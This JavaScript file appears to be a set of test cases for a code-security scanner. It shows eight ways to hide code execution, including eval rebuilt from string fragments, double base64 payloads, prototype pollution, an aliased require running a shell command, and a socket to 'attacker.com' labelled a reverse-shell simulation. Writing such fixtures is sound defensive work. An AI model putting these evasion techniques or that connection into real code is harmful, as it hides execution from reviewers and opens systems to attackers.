/**
 * SARB CASE 1: String Fragmentation
 * Evasion: Reconstructing "eval" from fragments in a dynamic property access.
 */
const a = "ev";
const b = "al";
global[a + b]("console.log('SARB 1: fragmentation success')");

/**
 * SARB CASE 2: Double Base64 Encoding
 * Evasion: Nesting "eval('...') " in two layers of base64 to avoid simple decoders.
 */
// "ZXZhbCgnY29uc29sZS5sb2coIlNB UkIgMjogZG91YmxlIGJhc2U2NCIpJyk=" (eval(...) in b64)
const encodedInner = "ZXZhbCgnY29uc29sZS5sb2coIlNB UkIgMjogZG91YmxlIGJhc2U2NCIpJyk=";
const encodedOuter = Buffer.from(encodedInner).toString('base64');
const decoded = Buffer.from(Buffer.from(encodedOuter, 'base64').toString(), 'base64').toString();
Function(decoded)();

/**
 * SARB CASE 3: Indirect Prototype Pollution Sink
 * Evasion: Polluting Object.prototype to create a trap that eventually calls eval.
 */
Object.prototype.malicious_trap = eval;
const innocentObj = {};
innocentObj.malicious_trap("console.log('SARB 3: proto pollution success')");

/**
 * SARB CASE 4: Deferred Intent (Exporting Sinks)
 * Evasion: Not executing anything locally, but exporting a risky alias for others to use.
 */
const dangerousAlias = eval;
export const runAction = dangerousAlias;

/**
 * SARB CASE 5: Async Delayed Execution
 * Evasion: Setting a timeout to execute a string payload later.
 */
setTimeout("console.log('SARB 5: async delay success')", 100);

/**
 * SARB CASE 6: Function Constructor Chain
 * Evasion: Using Function to access process and exit.
 */
const f = Function;
f("console.log('SARB 6: function constructor success')")();

/**
 * SARB CASE 7: Indirect Require Execution
 * Evasion: Aliasing require and using it to spawn a process.
 */
const r = require;
r("child_process").exec("echo SARB 7: indirect require success");

/**
 * SARB CASE 8: Kill Switch - Reverse Shell Simulation
 * Evasion: Direct connection of socket to stdin.
 */
const net = require("net");
const client = new net.Socket();
client.connect(8080, "attacker.com", () => {
    client.pipe(process.stdin); // Deterministic Kill Switch trigger
});
